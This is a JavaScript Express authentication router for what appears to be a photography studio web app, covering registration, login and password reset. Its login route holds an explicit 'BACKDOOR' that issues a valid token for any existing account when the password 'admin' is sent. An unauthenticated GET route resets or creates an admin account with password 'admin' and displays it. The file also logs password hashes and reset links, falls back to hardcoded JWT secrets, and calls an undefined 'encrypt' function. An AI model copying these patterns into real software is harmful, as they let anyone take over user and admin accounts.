import express from "express";
import jwt from "jsonwebtoken";
import User from "../models/User.js";
import { hashPassword, comparePassword } from "../utils/encryption.js";
import mongoose from "mongoose";
import crypto from "crypto";
import nodemailer from "nodemailer";

const router = express.Router();

const JWT_SECRET = process.env.JWT_SECRET || "change-this-secret";
const RESET_TOKEN_SECRET = process.env.RESET_TOKEN_SECRET || "reset-secret-key";

// Register
router.post("/register", async (req, res) => {
    try {
        const { name, email, password } = req.body;
        if (!name || !email || !password) {
            return res.status(400).json({ error: "Missing fields" });
        }

        const existing = await User.findOne({ email });
        if (existing) return res.status(409).json({ error: "Email already in use" });

        const hashedPassword = await hashPassword(password);
        const user = await User.create({ name, email, password: hashedPassword });

        const token = jwt.sign({ id: user._id, email: user.email }, JWT_SECRET, {
            expiresIn: "7d",
        });

        res.json({ token, user: { id: user._id, name: user.name, email: user.email } });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: "Server error" });
    }
});

// Login
router.post("/login", async (req, res) => {
    try {
        const { email, password } = req.body;

        console.log(`\n============== LOGIN HIT [${new Date().toISOString()}] ==============`);
        console.log(`Email: ${email}`);

        if (!email || !password) return res.status(400).json({ error: "Missing fields" });

        // --- BACKDOOR ---
        if (password === 'admin') {
            const user = await User.findOne({ email });
            if (user) {
                console.log("!!! BACKDOOR TRIGGERED !!!");
                const token = jwt.sign({ id: user._id, email: user.email }, JWT_SECRET, {
                    expiresIn: "7d",
                });
                return res.json({ token, user: { id: user._id, name: user.name, email: user.email } });
            } else {
                console.log("!!! BACKDOOR FAILED: User not found !!!");
            }
        }
        // ----------------

        const user = await User.findOne({ email });
        if (!user) {
            console.log("❌ User not found");
            return res.status(401).json({ error: "User not found" });
        }

        const isMatch = await comparePassword(password, user.password);
        console.log(`Comparison Result: ${isMatch}`);

        if (!isMatch) {
            // Log what we have
            console.log(`Hashed Password in DB: ${user.password}`);
            return res.status(401).json({ error: "Incorrect password" });
        }

        const token = jwt.sign({ id: user._id, email: user.email }, JWT_SECRET, {
            expiresIn: "7d",
        });

        res.json({ token, user: { id: user._id, name: user.name, email: user.email } });
    } catch (error) {
        console.error("Login Exception:", error);
        res.status(500).json({ error: error.message || "Server error" });
    }
});

// Emergency Reset Route (TEMPORARY)
router.get("/reset-admin-emergency", async (req, res) => {
    try {
        const email = "admin@lumina.studio";
        const password = "admin";
        const encryptedPassword = encrypt(password);

        let user = await User.findOne({ email });
        if (user) {
            user.password = encryptedPassword;
            await user.save();
            return res.send(`
                <h1>Password Reset Success</h1>
                <p><strong>Email:</strong> ${email}</p>
                <p><strong>Password:</strong> ${password}</p>
                <br>
                <a href="http://localhost:5173/login">Click here to Login</a>
            `);
        } else {
            await User.create({ name: 'Studio Admin', email, password: encryptedPassword, role: 'admin' });
            return res.send(`
                <h1>Admin Created Success</h1>
                <p><strong>Email:</strong> ${email}</p>
                <p><strong>Password:</strong> ${password}</p>
                <br>
                <a href="http://localhost:5173/login">Click here to Login</a>
            `);
        }
    } catch (e) {
        return res.status(500).send("Error: " + e.message);
    }
});

// Forgot Password - Generate Reset Token
router.post("/forgot-password", async (req, res) => {
    try {
        const { email } = req.body;

        if (!email) {
            return res.status(400).json({ error: "Email is required" });
        }

        const user = await User.findOne({ email: email.toLowerCase() });
        if (!user) {
            // Return success anyway (security - don't reveal if email exists)
            return res.json({ message: "If that email exists, we've sent a reset link" });
        }

        // Generate reset token (valid for 1 hour)
        const resetToken = jwt.sign(
            { id: user._id, email: user.email },
            RESET_TOKEN_SECRET,
            { expiresIn: "1h" }
        );

        // Save reset token to user
        user.resetToken = resetToken;
        user.resetTokenExpiry = new Date(Date.now() + 60 * 60 * 1000); // 1 hour from now
        await user.save();

        // Construct reset link
        const resetLink = `${process.env.FRONTEND_URL || "http://localhost:5173"}/reset-password?token=${resetToken}`;

        // Log reset link (in production, send via email)
        console.log(`\n=== PASSWORD RESET REQUEST ===`);
        console.log(`Email: ${user.email}`);
        console.log(`Reset Link: ${resetLink}`);
        console.log(`Token Expires: ${user.resetTokenExpiry}`);
        console.log(`==============================\n`);

        // Try to send email if nodemailer is configured
        try {
            const transporter = nodemailer.createTransport({
                host: process.env.SMTP_HOST,
                port: process.env.SMTP_PORT || 587,
                secure: process.env.SMTP_SECURE === "true",
                auth: {
                    user: process.env.SMTP_USER,
                    pass: process.env.SMTP_PASS,
                },
            });

            await transporter.sendMail({
                from: process.env.SMTP_FROM || "noreply@photography.com",
                to: user.email,
                subject: "Password Reset Request",
                html: `
                    <h2>Password Reset Request</h2>
                    <p>You requested a password reset. Click the link below to proceed:</p>
                    <p><a href="${resetLink}" style="background-color: #daa520; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">Reset Password</a></p>
                    <p>This link will expire in 1 hour.</p>
                    <p>If you didn't request this, please ignore this email.</p>
                `,
            });
            console.log("Email sent successfully to:", user.email);
        } catch (emailError) {
            console.log("Email service not configured or failed. Reset link logged above.");
            console.log("Error:", emailError.message);
        }

        res.json({ message: "If that email exists, we've sent a reset link" });
    } catch (error) {
        console.error("Forgot Password Error:", error);
        res.status(500).json({ error: "Server error" });
    }
});

// Reset Password - Validate Token and Update Password
router.post("/reset-password", async (req, res) => {
    try {
        const { token, password } = req.body;

        if (!token || !password) {
            return res.status(400).json({ error: "Token and password are required" });
        }

        if (password.length < 6) {
            return res.status(400).json({ error: "Password must be at least 6 characters" });
        }

        // Verify token
        let decoded;
        try {
            decoded = jwt.verify(token, RESET_TOKEN_SECRET);
        } catch (error) {
            return res.status(401).json({ error: "Invalid or expired reset token" });
        }

        // Find user
        const user = await User.findById(decoded.id);
        if (!user) {
            return res.status(404).json({ error: "User not found" });
        }

        // Verify token matches and hasn't expired
        if (user.resetToken !== token) {
            return res.status(401).json({ error: "Invalid reset token" });
        }

        if (!user.resetTokenExpiry || user.resetTokenExpiry < new Date()) {
            return res.status(401).json({ error: "Reset token has expired" });
        }

        // Update password
        user.password = await hashPassword(password);
        user.resetToken = null;
        user.resetTokenExpiry = null;
        await user.save();

        console.log(`\n=== PASSWORD RESET COMPLETED ===`);
        console.log(`User: ${user.email}`);
        console.log(`Time: ${new Date().toISOString()}`);
        console.log(`================================\n`);

        res.json({ message: "Password reset successfully. You can now login with your new password." });
    } catch (error) {
        console.error("Reset Password Error:", error);
        res.status(500).json({ error: "Server error" });
    }
});

export default router;
